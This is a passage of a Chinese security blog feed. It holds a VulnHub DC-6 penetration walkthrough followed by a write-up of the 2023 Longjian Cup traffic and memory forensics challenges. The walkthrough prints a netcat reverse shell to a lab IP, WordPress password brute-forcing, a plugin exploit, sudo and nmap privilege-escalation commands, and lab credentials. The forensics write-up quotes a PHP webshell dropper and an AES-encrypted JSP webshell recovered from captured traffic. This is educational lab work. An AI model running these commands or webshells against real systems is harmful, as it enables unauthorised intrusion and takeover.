192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171834090.png" alt="image-20240117183420041"></p><pre><code>开放22端口 存在ssh服务 OpenSSH版本 7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><h3 id="二、修改hosts文件-进行重定向"><a href="#二、修改hosts文件-进行重定向" class="headerlink" title="二、修改hosts文件 进行重定向"></a>二、修改hosts文件 进行重定向</h3><p>我们可以看到在扫到的80端口处 说明了不能直接定向到目标网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181745520.png" alt="image-20240118174515479"></p><p>我们尝试访问网站  当然也是访问不了的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181744269.png" alt="image-20240118174402203"></p><p>那就需要我们修改本地hosts文件(&#x2F;etc&#x2F;hosts)  将ip和域名添加进去</p><pre><code>192.168.160.157 wordy</code></pre><p>就可以成功访问了 (访问192.168.160.157)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182157924.png" alt="image-20240118215758484"></p><p>能看到是一个wordpress的网站</p><h3 id="三、网站信息搜集"><a href="#三、网站信息搜集" class="headerlink" title="三、网站信息搜集"></a>三、网站信息搜集</h3><h4 id="使用whatweb看网站信息"><a href="#使用whatweb看网站信息" class="headerlink" title="使用whatweb看网站信息"></a>使用whatweb看网站信息</h4><pre><code>whatweb -v 192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182158418.png" alt="image-20240118215835245"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182159742.png" alt="image-20240118215918499"></p><p>看到wordpress的版本是5.1.1</p><h4 id="使用dirsearch-py扫目录"><a href="#使用dirsearch-py扫目录" class="headerlink" title="使用dirsearch.py扫目录"></a>使用dirsearch.py扫目录</h4><pre><code>python3 ./dirsearch.py -u http://192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182210224.png" alt="image-20240118221023088"></p><p>扫到了该网站wordpress的后台登陆页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219850.png" alt="image-20240118221904796"></p><p>还扫到了一个目录页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219324.png" alt="image-20240118221933265"></p><h4 id="使用cewl搜集网站登录密码"><a href="#使用cewl搜集网站登录密码" class="headerlink" title="使用cewl搜集网站登录密码"></a>使用cewl搜集网站登录密码</h4><p>既然扫到了网站后台登陆页面 我们就来搜集一波网站里面的密码 使用cewl</p><p>cewl的使用姿势在DC-2的文章中有提到<a href="https://w3nx1z1.github.io/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/">DC-2通关记录</a></p><pre><code>cewl http://wordy/ -w dc6dict.txt从网站中获取密码并将其保存在dc6dict.txt文件中</code></pre><h4 id="首页信息"><a href="#首页信息" class="headerlink" title="首页信息"></a>首页信息</h4><p>网站首页的信息提示我们可能与插件有关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182232914.png" alt="image-20240118223258687"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182233611.png" alt="image-20240118223314553"></p><h3 id="四、wpscan爆破网站密码"><a href="#四、wpscan爆破网站密码" class="headerlink" title="四、wpscan爆破网站密码"></a>四、wpscan爆破网站密码</h3><p>我们已经有了网站密码字典 在使用wpscan扫一下网站用户名字典</p><pre><code>wpscan --url http://wordy/ -e u </code></pre><p>扫出来五个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182238256.png" alt="image-20240118223810205"></p><p>制作一个用户名字典 写入这些用户名 使用wpscan开始爆破</p><pre><code>wpscan wpscan --url http://dc-2/ -P dc6dict.txt -U user.txt</code></pre><p>没爆出来 那我们换个字典 直接使用kali里面自带的字典<code>rockyou.txt</code> 并且作者在靶场下载页面处还给了一个提示 方便我们缩小密码字典范围 便于爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182305673.png" alt="image-20240118230529591"></p><pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txtwpscan --url http://wordy/ -P passwords.txt -U user.txt </code></pre><p>爆破出一组账号密码<code>mark / helpdesk01</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182308006.png" alt="image-20240118230819959"></p><p>使用这组账号密码登陆 网站后台 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182309959.png" alt="image-20240118230928877"></p><h3 id="五、漏洞发现与利用"><a href="#五、漏洞发现与利用" class="headerlink" title="五、漏洞发现与利用"></a>五、漏洞发现与利用</h3><h4 id="activity-monitor插件漏洞"><a href="#activity-monitor插件漏洞" class="headerlink" title="activity monitor插件漏洞"></a>activity monitor插件漏洞</h4><p>登陆进去之后 可以看到有一个<code>activity monitor</code> 插件 结合首页上的提示 猜测这个插件有漏洞</p><h5 id="方法一：使用searchsploit搜索漏洞利用脚本"><a href="#方法一：使用searchsploit搜索漏洞利用脚本" class="headerlink" title="方法一：使用searchsploit搜索漏洞利用脚本"></a>方法一：使用searchsploit搜索漏洞利用脚本</h5><p>直接使用searchsploit搜索漏洞脚本</p><pre><code>searchsploit activity monitor</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609102.png" alt="image-20240228160910052"></p><p>直接找一下最后一个</p><pre><code>searchsploit -p 50110.py</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609279.png" alt="image-20240228160944243"></p><pre><code>cp /usr/share/exploitdb/exploits/php/webapps/50110.py 50110.py</code></pre><p>看一下里面的内容 用法里面写着直接python运行就可以了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281627638.png" alt="image-20240228162714585"></p><p>成功拿到权限 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281629064.png" alt="image-20240228162938028"></p><p>为了便于操作 我们在反弹shell并创建一个新的交互式终端</p><pre><code>nc -e /bin/bash 192.168.160.131 4444   nc -lvvp 4444python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281939666.png" alt="image-20240228193904627"></p><h5 id="方法二：在页面插件处进行命令执行"><a href="#方法二：在页面插件处进行命令执行" class="headerlink" title="方法二：在页面插件处进行命令执行"></a>方法二：在页面插件处进行命令执行</h5><p>还是在插件的页面  我们找到了一处可以注入的点</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281916924.png" alt="image-20240228191642845"></p><p>lookup按钮会将填入的ip地址解析为主机名 我们尝试随便写一个ip地址并注入命令进行抓包测试</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281922648.png" alt="image-20240228192247557"></p><p>很明显 后面我们注入的<code>ls</code>命令被成功执行了 那就可以在这个页面进行命令注入反弹shell 在创建一个交互式终端</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016344.png" alt="image-20240228201634263"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016870.png" alt="image-20240228201646830"></p><h3 id="六、提权-nmap提权"><a href="#六、提权-nmap提权" class="headerlink" title="六、提权(nmap提权)"></a>六、提权(nmap提权)</h3><p>在文件系统中进行翻找 在<code>/home/mark/stuff</code>文件夹下找到一个<code>things-to-do.txt</code>文件 读取文件内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282033562.png" alt="image-20240228203350516"></p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>在这里面找到了用户<code>graham</code>的登录密码<code>GSo7isUM1D4</code> 切换用户</p><p>查看可以使用的sudo权限命令</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282057054.png" alt="image-20240228205758013"></p><p>发现这个<code>/home/jens/backups.sh</code>文件可以无密码执行  读一下内容</p><pre><code>#!/bin/bashtar -czf backups.tar.gz /var/www/html</code></pre><p>将<code>/bin/bash</code>写入这个文件 在运行 就可以获得jens权限的shell(因为backups.sh可以无密码运行)</p><pre><code class="bash">echo &quot;/bin/bash&quot; &gt;&gt;backups.shsudo -u jens /home/jens/backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109825.png" alt="image-20240228210914783"></p><p>再次查看jens用户拥有的sudo权限命令 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109205.png" alt="image-20240228210958162"></p><p>发现可以无密码使用nmap 直接找一下nmap提权</p><p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170912594416800197039668%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170912594416800197039668&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-117165224-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=nmap%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187">nmap提权几种方式</a>  这里我们选择方法二  使用nmap –script参数执行脚本</p><pre><code class="bash">echo &#39;os.execute(&quot;/bin/bash&quot;)&#39; &gt; 1.nse # nse是nmao插件扩展名sudo nmap --script=/home/jens/1.useid</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120403.png" alt="image-20240228212018376"></p><pre><code>cd /rootcat theflag.txt</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282120269.png" alt="image-20240228212047220"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>至此 DC-6渗透完毕</p><pre><code>wpscan爆破密码activity monitor插件漏洞nmap提权</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023陇剑杯</title>
      <link href="/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/"/>
      <url>/2024/02/27/2023%E9%99%87%E5%89%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="2023陇剑杯初赛"><a href="#2023陇剑杯初赛" class="headerlink" title="2023陇剑杯初赛"></a>2023陇剑杯初赛</h1><pre><code>陇剑杯初赛的时候正好赶上我在带训 实在不好请假 遗憾错过流量分析杯 遂来复现一手</code></pre><h2 id="baby-forensics"><a href="#baby-forensics" class="headerlink" title="baby_forensics"></a>baby_forensics</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040033023.png" alt="image-20240204003301941"></p><p>要key  直接找关于key的文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 filescan | findstr &quot;key&quot;.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003df94070 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>导出来 重新命名为key.txt 内容是</p><pre><code>E96&lt;6J:Da6g_b_f_gd75a3d4ch4heg4bab66ad5d     </code></pre><p>估计还得在操作  随波逐流梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040052245.png" alt="image-20240204005247186"></p><pre><code>thekeyis2e80307085fd2b5c49c968c323ee25d5</code></pre><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040053671.png" alt="image-20240204005326608"></p><p>要计算机就提取计算器的进程</p><p>积累一下 计算器在计算机中的进程是<code>calc.exe</code></p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 pslist</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040055638.png" alt="image-20240204005552594"></p><p>导出来保存为data文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2844 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>将1.data放到kali的gimp里面查看图像 需要调一下高度、宽度和偏移值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402040112762.png" alt="image-20240204011216677"></p><p>得到计算器中的数字</p><pre><code>7598632541</code></pre><p>看wp还学到了一种做法 我们使用vol2的windows插件 并将其另存为<code>windows</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 windows &gt;windows</code></pre><p>在这个文件里面直接翻 计算器的进程<code>calc.exe</code> 直接找到计算器的运行结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402102309685.png" alt="image-20240210230950647"></p><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127039.png" alt="image-20240204120242491"></p><p>在使用r-studio翻找关键文件的时候 在Music文件夹找到一个<code>i4ak3y</code>文件 打开查看内容 应该是一个解密密钥</p><pre><code>qwerasdf</code></pre><p>这道题我们需要用到计算机中便签的进程 也就是<code>StikyNot.exe</code></p><pre><code>StikyNot.exe 是Windows操作系统中的一个应用程序，也就是桌面上的便签小工具。它的主要作用是提供一个简单的方式来创建、编辑和管理便签，以便用户可以在桌面上快速记录和查看重要的信息、提醒事项或备忘录。关于StikyNot.exe 的内存的作用，它主要用于存储和管理用户创建的便签内容。当用户打开StikyNot.exe 应用程序时，操作系统会为该程序分配一定的内存空间，用于存储便签的文本、颜色、位置等信息。这样，当用户关闭应用程序或重新启动计算机时，便签的内容仍然可以被保存下来，以便下次使用时能够恢复之前的状态。总结来说，StikyNot.exe 的内存的作用是为了存储和管理用户创建的便签内容，确保便签信息的持久性和可恢复性。</code></pre><p>找到StikyNot.exe进程并将其提取出来 PID是2968</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111603493.png" alt="image-20240211160329431"></p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a\baby_forensics.raw --profile=Win7SP1x64 memdump -p 2968 -D E:\Desktop\比赛\2023陇剑杯\BF\baby_forensics_58a2fd5b17eac8108638f334c399de4a</code></pre><p>将后缀改为data  使用gimp打开 调一下宽高</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111620937.png" alt="image-20240211162030868"></p><p>看到一串字符</p><pre><code>U2FsdGVkX195MCsw0ANs6/Vkjibq89YlmnDdY/dCNKRkixvAP6+B5ImXr2VIqBSp94qfIcjQhDxPgr9G4u++pA==</code></pre><p>看到<code>U2Fsd</code>的头 想到很多使用对称加密在线网站的结果都有这个头 在结合上面找到的密码 直接进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111652856.png" alt="image-20240211165231813"></p><p>也可以直接在内存文件里面翻 有<code>U2Fsd</code>头的内容进行解密 但是多少还是有点草率</p><p>也可以写个check函数帮助筛选内存文件中可能是flag的内容 参考下面文章</p><p><a href="https://blog.csdn.net/Ahi0upsec/article/details/132549714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170757131916800184120961%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170757131916800184120961&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-132549714-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=2023%E9%99%87%E5%89%91%E6%9D%AF&spm=1018.2226.3001.4187">2023陇剑杯wp</a></p><pre><code class="bash">#!/bin/bashcheck() &#123;    pattern=&quot;flag|==|10210897103|666c6167|464C4147|Zmxh|Wm14aFoz|&amp;#102|58s4vb|2uk2h3|key|pass|pwd|password|hint|U2FsdGVkX1&quot;    &gt; check.txt  # 清空或创建 check.txt 文件    grep -irlE &quot;$pattern&quot; 1.raw | while read -r file; do        echo -e &quot;File: $file&quot; &gt;&gt; check.txt        strings &quot;$file&quot; | grep -iE &quot;$pattern&quot; &gt;&gt; check.txt        echo -e &quot;&quot; &gt;&gt; check.txt    done&#125;check  # 调用 check 函数echo &quot;检查完成，请查看 check.txt 文件&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111713412.png" alt="image-20240211171337367"></p><h2 id="ez-web"><a href="#ez-web" class="headerlink" title="ez_web"></a>ez_web</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111716058.png" alt="image-20240211171631986"></p><p>看了一下分组计数器 4xx很多 说明还是存在目录扫描的 我的思路还是先从响应码200的请求包开始找  先筛选一下</p><pre><code>http.response.code == 200</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111753613.png" alt="image-20240211175345527"></p><p>不是很多 从上到下翻找一下 第三个包找到了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111758514.png" alt="image-20240211175852466"></p><pre><code>a=file_put_contents%28%27d00r.php%27%2C+base64_decode%28%27PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs%2FPg%3D%3D%27%29%29%3B</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111759380.png" alt="image-20240211175932288"></p><p>到这可能觉得<code>d00r.php</code>就是正确答案了 但是在比赛的时候提交是不正确的 那就在往上一级找一下  那就是<code>ViewMore.php</code></p><h3 id="2-1"><a href="#2-1" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111801971.png" alt="image-20240211180120905"></p><p>在上一题后面继续往后翻 看到使用了ifconfig命令  这个包是第10098流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402120009624.png" alt="image-20240212000917581"></p><p>在追踪一下http流 看一下获取ip地址的结果</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122241297.png" alt="image-20240212224132249"></p><p>上面的192.168.160.130是已经出现的 那下面的192.168.160.132就是服务器ip了</p><pre><code>192.168.160.132</code></pre><h3 id="3-1"><a href="#3-1" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402111805362.png" alt="image-20240211180507299"></p><p>还是一样在http流里面看 先看到读取了passwd文件的内容 <code>7e03864b0db7e6f9</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122309057.png" alt="image-20240212230949011"></p><p>还找到写入了一个base64编码的文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122159971.png" alt="image-20240212215923913"></p><p>是个压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402122317638.png" alt="image-20240212231726573"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127100.png" alt="image-20240212231740914"></p><p>将压缩包保存下来  尝试使用上面读取的密码解压 得到key.txt</p><pre><code>7d9ddff2-2d67-4eba-9e48-b91c26c42337</code></pre><h2 id="hacked"><a href="#hacked" class="headerlink" title="hacked"></a>hacked</h2><h3 id="1-2"><a href="#1-2" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272127575.png" alt="image-20240212232426112"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132329684.png" alt="image-20240213232909590"></p><p> 追踪register页面可以找到加密算法</p><pre><code class="javascript">  &lt;script language=&quot;javascript&quot;&gt;    crypt_key = &#39;l36DoqKUYQP0N7e1&#39;;  crypt_iv = &#39;131b0c8a7a6e072e&#39;;  var key = CryptoJS.enc.Utf8.parse(crypt_key);   var iv = CryptoJS.enc.Utf8.parse(crypt_iv);   function Encrypt(word)&#123;    srcs = CryptoJS.enc.Utf8.parse(word);    var encrypted = CryptoJS.AES.encrypt(srcs, key, &#123; iv: iv,mode:CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7&#125;);    return encrypted.toString();  &#125;  function print()&#123;    var a = Encrypt(myform.username.value);    var b = Encrypt(myform.password.value);    &#125;</code></pre><p>写个解密脚本</p><pre><code class="python">from Crypto.Cipher import AESimport base64crypt_key = b&#39;l36DoqKUYQP0N7e1&#39;crypt_iv = b&#39;131b0c8a7a6e072e&#39;def decrypt(ciphertext):    cipher = AES.new(crypt_key, AES.MODE_CBC, crypt_iv)    decrypted = cipher.decrypt(base64.b64decode(ciphertext))    # 移除 PKCS7 填充    decrypted = _remove_pkcs7_padding(decrypted)    return decrypted.decode(&#39;utf-8&#39;)def _remove_pkcs7_padding(data):    padding_len = data[-1]    return data[:-padding_len]# 解密用户名和密码encrypted_username = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;decrypted_username = decrypt(encrypted_username)print(&#39;Decrypted Username:&#39;, decrypted_username)encrypted_password = &quot;pl3HJGsgs1Zn43qjV5Qx8w==&quot;decrypted_password = decrypt(encrypted_password)print(&#39;Decrypted Password:&#39;, decrypted_password)</code></pre><p>用上面这组用户名和密码 解出来为<code>aaa/aaa</code> 我们同样追踪register页面 找到admIn的那一组就好</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132345081.png" alt="image-20240213234532033"></p><pre><code>flag&#123;WelC0m5_TO_H3re&#125;</code></pre><h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132333038.png" alt="image-20240213233302974"></p><p>第68个流看到一串很奇妙的字符 直接搜索SECRET_KEY </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347439.png" alt="image-20240213234748388"></p><p>解码一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132347671.png" alt="image-20240213234759606"></p><pre><code>ssti_flask_hsfvaldb</code></pre><h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402132348796.png" alt="image-20240213234820734"></p><p>是flask的session注入漏洞 需要用到<code>flask-session-cookie-manager</code>这个工具来解密session</p><p>用法就是</p><pre><code>python3 ./flask_session_cookie_manager.py -c cookie密文 -s 密钥</code></pre><p>然后在流量包里面解密session值就可以了 密钥就是上面第二题<code>ssti_flask_hsfvaldb</code></p><p>我们直接看回显 像这种正常在页面上回显的基本上没有什么问题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182049988.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182050900.png"></p><p>直接找有问题的 一个没有回显 一个回显None</p><p>![(<a href="https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png">https://raw.githubusercontent.com/w3n1z1/blogimage/main/image/202402182139955.png</a>)</p><p>求包看到了执行了whoami命令 返回包看到用户是red</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182140952.png" alt="image-20240218214056815"></p><p>因此 flask网站是由<code>red</code>用户启动的</p><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182141484.png" alt="image-20240218214151413"></p><p>一共就那么几个路由 都试试就出了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182149897.png" alt="image-20240218214937822"></p><pre><code>Index</code></pre><h2 id="hard-web"><a href="#hard-web" class="headerlink" title="hard_web"></a>hard_web</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182150196.png" alt="image-20240218215039122"></p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>看到这种找服务器开放端口的题 其实原理问的就是tcp三次握手 开放了端口肯定存在返回的ACK标志 那便需要我们找ACK标志</p><p>先判断服务器的ip地址  这个很好判断就是<code>192.168.162.180</code></p><p>使用tcpdump </p><pre><code>tcpdump -n -r /home/kali/Desktop/hard_web.pcap &#39;tcp[13] =18&#39; | awk &#39;&#123;print $3&#125;&#39; | sort -u </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182347584.png" alt="image-20240218234755533"></p><p>前三个就是 那么开放的端口就是<code>80 888 8888 </code></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>也可以直接在wireshark里面进行筛选 条件语句可以这样写</p><pre><code>tcp.connection.synack and ip.dst==192.168.162.188</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182349623.png" alt="image-20240218234944540"></p><h3 id="2-3"><a href="#2-3" class="headerlink" title="2"></a>2</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402182350454.png" alt="image-20240218235010397"></p><p>在传入jsp脚本之后 第一次进行命令执行的包处 追踪http流 找到key加密的过程</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402272128052.png" alt="image-20240219171505923"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191752400.png" alt="image-20240219175250365"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402190014668.png" alt="image-20240219001430628"></p><pre><code class="javascript">&lt;%! String xc=&quot;748007e861908c03&quot;; class X extends ClassLoader&#123;    public X(ClassLoader z)&#123;        super(z);    &#125;public Class Q(byte[] cb)&#123;        return super.defineClass(cb, 0, cb.length);    &#125; &#125;public byte[] x(byte[] s,boolean m)&#123;     try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&quot;AES&quot;);        c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),&quot;AES&quot;));        return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%&gt;&lt;%try&#123;    byte[] data=new byte[Integer.parseInt(request.getHeader(&quot;Content-Length&quot;))];    java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);    if (session.getAttribute(&quot;payload&quot;)==null)&#123;        session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));    &#125;else&#123;        request.setAttribute(&quot;parameters&quot;, data);        Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();        java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();        f.equals(arrOut);        f.equals(pageContext);        f.toString();        response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%&gt;</code></pre><p>可以看到有gunzip和aes aes加密的key也给了<code>748007e861908c03</code>   找到最后一个jsp加密流量 将密文以hex的形式转储</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191756710.png" alt="image-20240219175653599"></p><p>用厨子进行解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191757521.png" alt="image-20240219175752452"></p><h3 id="3-3"><a href="#3-3" class="headerlink" title="3"></a>3</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191758211.png" alt="image-20240219175813153"></p><p>直接将aes的解密密钥解md5即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191806589.png" alt="image-20240219180602528"></p><pre><code>14mk3y</code></pre><h2 id="IncidentResponse"><a href="#IncidentResponse" class="headerlink" title="IncidentResponse"></a>IncidentResponse</h2><h3 id="1-4"><a href="#1-4" class="headerlink" title="1"></a>1</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402191807183.png" alt="image-20240219180755108"></p><p>首先对服务器进行挂载仿真</p><p>题目中给出了登陆服务器的账号密码<code>root/IncidentResponsePasswd</code> 直接登陆root账户 </p><p>这里我想的是先连上xshell 通过xftp将服务器中的文件下载下来 在使用D盾河马等工具进行扫描</p><p>在对服务器进行仿真挂载之后 选择NAT模式 使用ifconfig查看ip地址 会发现没有ens33网卡</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402262041803.png" alt="image-20240226204115751"></p><p>找到一篇解决问题的文章<a 